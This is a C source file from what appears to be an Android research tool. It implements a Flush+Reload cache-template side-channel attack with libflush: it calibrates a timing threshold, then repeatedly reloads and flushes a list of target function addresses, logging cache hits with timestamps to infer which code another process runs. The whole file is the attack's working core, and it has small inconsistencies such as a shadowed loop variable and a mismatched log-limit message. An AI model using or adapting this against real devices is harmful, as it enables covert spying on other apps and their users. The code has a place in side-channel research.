/* See LICENSE file for license and copyright information */

#define _GNU_SOURCE

#include <stdio.h>
#include <stdbool.h>
#include <stdlib.h>
#include <getopt.h>
#include <inttypes.h>
#include <sched.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <android/log.h>
#include <libflush/libflush.h>

#include "configuration.h"
#include "lock.h"
#include "libflush.h"

#ifdef WITH_THREADS
#include <pthread.h>
#include "threads.h"
#else
#ifndef WITH_ANDROID
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#else
#include <linux/ashmem.h>
#endif

#include <android/log.h>


static int shared_data_shm_fd = 0;
#endif

#include "logoutput.h"
#include "calibrate.h"
#define BIND_TO_CPU 0

#define LENGTH(x) (sizeof(x)/sizeof((x)[0]))

/* Forward declarations */
static void attack_slave(libflush_session_t* libflush_session, 
                         int* threshold, pthread_mutex_t* g_lock, 
                         size_t* addr, size_t length, int* flags, size_t* continueRun, int switch_of_compiler, long* times, int* logs, int* thresholds, int* log_length);

//size_t *addr;
//size_t length;

/*
#define TAG_NAME "libflush"
#define log_err(fmt,args...) __android_log_print(ANDROID_LOG_ERROR, TAG_NAME, (const char *) fmt, ##args)
*/
int testingforaddr(libflush_session_t* libflush_session, int *threshold, size_t* addr){
    int hitnumber = 0;
    for(int count=0;count<10000;count++){
	for(int i=1;i<4;i++){
            uint64_t count = libflush_reload_address_and_flush(libflush_session, addr[i]);
            if (count <= *threshold){
    	    	hitnumber++;
            }
        }
    }
    if(hitnumber>2)
	return -10;
    else
	return 10;
}


int hit(int cpu, int *threshold, pthread_mutex_t* g_lock, size_t* addr, size_t length, int* flags, int* thd, size_t* continueRun, int switch_of_compiler, long* times, int* logs, int* thresholds, int* log_length)
//addr: func list
//length: the length of func list
//number_of_forks: 1
//the address of target function
{
    LOGD("Start.\n");
    //size_t threshold = 0; 
    //length = length_;
    //addr = malloc(sizeof(size_t)*length);
    //memcpy(addr,addr_,sizeof(size_t)*length);
    for(int i=0;i<length;i++)
      LOGD("address:%p",addr[i]);
    useconds_t offset_update_time = OFFSET_UPDATE_TIME;
    size_t number_of_tests = NUMBER_OF_TESTS;
    FILE* logfile = NULL;
    /* Initialize libflush */
    libflush_session_t* libflush_session;
    libflush_init(&libflush_session, NULL);
    LOGD("Initialize successfully.\n");
    /* Start calibration */
    int direction = 40001;
    int r = 10000;
    if (*threshold == 0) {//try to get 3 times
        //fprintf(stdout, "[x] Start calibration... "); 
	*threshold = calibrate(libflush_session,thd); //get the threshold 
	if(*threshold<r)
	  r = *threshold;
	sleep(1);
	*threshold = calibrate(libflush_session,thd); //get the threshold 
        if(*threshold<r)
          r = *threshold;
	sleep(1);
	*threshold = calibrate(libflush_session,thd); //get the threshold
        if(*threshold<r)
          r = *threshold;
	*threshold = r;
	/*
	while(true){
	  r = testingforaddr(libflush_session,threshold,addr);
	  if(direction==40001)
	      direction = r;
	  *threshold += r;
	  LOGD("Adjusting Threshold %d",*threshold);
	  if(direction!=r){
	      *threshold += r;
              break;
	  }
	}
	*/
    }

    /* Start cache template attack */
    LOGD("[x] Threshold: %zu\n", *threshold);
    //LOGD("[x] Number of forks: %zu\n",number_of_forks);

    /* Bind to CPU */
    size_t number_of_cpus = sysconf(_SC_NPROCESSORS_ONLN);
    LOGD("[x] number of cpu: %zu\n", number_of_cpus);

    /* Start slaves */
    attack_slave(libflush_session, 
        threshold, g_lock, 
        addr,length,flags,continueRun,switch_of_compiler,times,logs, thresholds, log_length);
    /* Terminate libflush */
    libflush_terminate(libflush_session);
    return 0;
}

static void
attack_slave(libflush_session_t* libflush_session, int *threshold,
             pthread_mutex_t* g_lock, size_t* addr, size_t length,int* flags, 
	     size_t* continueRun, 
	     int switch_of_compiler, long* times, int* logs, int* thresholds, int* log_length)
{
    struct timeval tv;//for quering time stamp 
    size_t total_length = length; //record the total length
    length = switch_of_compiler;
    int repetitive_hit = 0;//we use the papram to determine whether we should shrink list.
    //gettimeofday(&tv,NULL);
    libflush_init(&libflush_session, NULL);
    LOGD("[x] attack target %d",length);
    /* Run Flush and reload */
    //uint64_t start = libflush_get_timing(libflush_session);
    int turns = 0;
    while(true){
      // if the turns reached 3000 or the same offset was hit more than many times repetitively, shrink the list; 
      //LOGD("Hit number %d, Turns %d",hit_number,turns);
      if((turns>=10000)&&length>10){
	LOGD("Turns %d",turns);
	//log_err("Hit number %d, Turns %d",hit_number,turns);
        length = switch_of_compiler;
	turns = 0;
      }
      //Traverse all addresses
      for(int crt_ofs=0; crt_ofs<length; crt_ofs=crt_ofs+1){
	if(addr[crt_ofs]==0)
	  continue;
	//load the address into cache to count the time, and then flush out
        uint64_t count = libflush_reload_address_and_flush(libflush_session, addr[crt_ofs]);  
        if (count <= *threshold)
        {
	  //if it is not a repetitive hit, we change the index. 
          gettimeofday(&tv,NULL);
          //LOGD("cache hit %p %d %ld", (void*) (addr[crt_ofs]),count, tv.tv_sec*1000+tv.tv_usec/1000);
	  //if current offset is the switch of compiler, expand the list.
	  if(crt_ofs==switch_of_compiler-1){ 
	    LOGD("Compiler was activated.");
	    length = total_length;
	    turns = 0;
	  }
	  //record the activation
	  pthread_mutex_lock(g_lock);
	  if(crt_ofs<switch_of_compiler-1){
	    flags[crt_ofs]+=1;//here I have got all functions' activation
            LOGD("cache hit %d %d", crt_ofs, count);
	  }
	  if(*log_length>=280000){
	      LOGD("Log Length is larger than 300000, set to 0.");
              *log_length = 0;
	  }
	  times[*log_length] = tv.tv_sec*1000+tv.tv_usec/1000;
	  thresholds[*log_length] = count;
	  logs[(*log_length)++] = crt_ofs;
	  pthread_mutex_unlock(g_lock);
        }
      }
      while(*continueRun<=0){ //pause
	    sleep(1);
      }
      turns++;
      usleep(50);//sleep to reduce cpu usage
   }
}
